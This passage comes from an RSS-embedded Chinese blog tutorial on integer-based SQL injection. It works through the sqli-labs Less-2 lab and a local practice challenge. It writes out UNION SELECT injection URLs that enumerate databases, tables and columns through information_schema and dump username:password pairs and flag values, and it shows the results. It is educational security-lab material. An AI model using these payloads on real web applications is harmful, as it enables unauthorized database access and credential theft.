class=&#34;line&#34;&gt;#输出操作系统的版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;variable&#34;&gt;@version&lt;/span&gt;_compile_os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#md5(str)可以对传入的字符串进行，d5加密，并返回加密后得到的&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;位字符串。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;md5(&lt;span class=&#34;string&#34;&gt;&amp;#x27;xxxx&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#使用某个拼接符如“:”来拼接str1和str2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;concat_ws(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;, str1, str2)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接着我们查询所在数据库的名字：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(schema_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;哦，原来是在security数据库中&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928231402676.png&#34; alt=&#34;image-20220928231402676&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;3）确定想从某个库中拿到什么表，从表中拿到什么列&#34;&gt;&lt;a href=&#34;#3）确定想从某个库中拿到什么表，从表中拿到什么列&#34; class=&#34;headerlink&#34; title=&#34;3）确定想从某个库中拿到什么表，从表中拿到什么列&#34;&gt;&lt;/a&gt;3）确定想从某个库中拿到什么表，从表中拿到什么列&lt;/h4&gt;&lt;p&gt;我们看看从security库中都可以读取什么表？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心&lt;/strong&gt;——在&lt;strong&gt;information_schema库&lt;/strong&gt;的&lt;strong&gt;Tables表&lt;/strong&gt;中，查询当table_schema的值为我们刚刚获取的security库时 &lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(table_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_schema &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; database() #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928231639522.png&#34; alt=&#34;image-20220928231639522&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;获取到security库中的所有表为&lt;/strong&gt;：&lt;code&gt;emails&lt;/code&gt;、&lt;code&gt;referers&lt;/code&gt;、&lt;code&gt;uagents&lt;/code&gt;、&lt;code&gt;users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们比较关心账号密码相关，所以眼光聚焦到users表。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心&lt;/strong&gt;——在&lt;strong&gt;information_schema库&lt;/strong&gt;的&lt;strong&gt;Columns表&lt;/strong&gt;中，查询当&lt;strong&gt;table_schema&lt;/strong&gt;的值为我们刚刚获取的&lt;code&gt;security&lt;/code&gt; 且 &lt;strong&gt;table_name&lt;/strong&gt;为&lt;code&gt;users&lt;/code&gt;时&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(column_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.columns &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_schema &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; database() &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; table_name &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;users&amp;#x27;&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;获取到security库中，users表里所有列为&lt;/strong&gt;：&lt;code&gt;id&lt;/code&gt;、&lt;code&gt;username&lt;/code&gt;、&lt;code&gt;password&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928232355430.png&#34; alt=&#34;image-20220928232355430&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们想要获取username 和 password的全部对应关系，使用concat_ws函数，把username和password用冒号拼接起来：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心&lt;/strong&gt;——由于已经知道了所在&lt;strong&gt;security库&lt;/strong&gt;，&lt;strong&gt;users表&lt;/strong&gt;，因此直接&lt;code&gt;select xxxx from security.users&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(concat_ws(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;, username, password)), &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; security.users #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928232842359.png&#34; alt=&#34;image-20220928232842359&#34;&gt;&lt;/p&gt;
&lt;p&gt;小练习&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt;查看注入类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-1.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-1.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; # 报错(整型和单引号都会报错)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#2.确定整型注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=1 # (只有整型不会报错)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: Kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#3.确定列数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=1 union select 1, 2, 3 #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: Kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#4.构造联合查询,确定所在库名。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), schema_name from information_schema.schemata #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: information_schema&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#5.确定在这个库中，都有什么表&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(table_name) from information_schema.tables where table_schema = database()#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: emails,flag,users&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#6.确定我们要找flag表，并看这个表中有什么列&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &amp;#x27;&lt;/span&gt;flag&lt;span class=&#34;string&#34;&gt;&amp;#x27;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: flag,value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#7.取列的值，另外把查询的from 后面改成对应的&amp;quot;库.表&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=2356 union select 1,database(), group_concat(concat_ws(&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;#x27;, flag, value)) from challenge.flag#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:any,flag8:sqlc,flag9:tasi,flag10:moo,flag12:false,flag11:muse&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;至此，整型注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
